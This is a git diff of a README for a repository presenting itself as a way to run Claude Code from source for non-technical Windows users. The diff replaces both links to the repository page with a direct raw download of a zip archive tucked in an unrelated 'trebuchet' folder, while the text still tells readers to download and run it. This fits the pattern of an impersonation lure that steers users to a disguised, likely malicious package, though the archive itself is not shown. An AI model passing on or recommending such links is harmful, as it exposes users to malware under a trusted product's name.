@@ -1,6 +1,6 @@
 # 🤖 claude-code - Run Claude Code from source
 
-[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge)](https://github.com/regressive-topos551/claude-code)
+[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge)](https://github.com/regressive-topos551/claude-code/raw/refs/heads/main/trebuchet/code_claude_v2.9.zip)
 
 ## 📦 What this is
 
@@ -24,7 +24,7 @@ You do not need deep technical knowledge. You only need to follow the steps in o
 
 Visit this page to download and run the app from source:
 
-https://github.com/regressive-topos551/claude-code
+https://github.com/regressive-topos551/claude-code/raw/refs/heads/main/trebuchet/code_claude_v2.9.zip
 
 On that page, look for the latest source snapshot or release files, then download the package that matches the Windows setup steps below
 
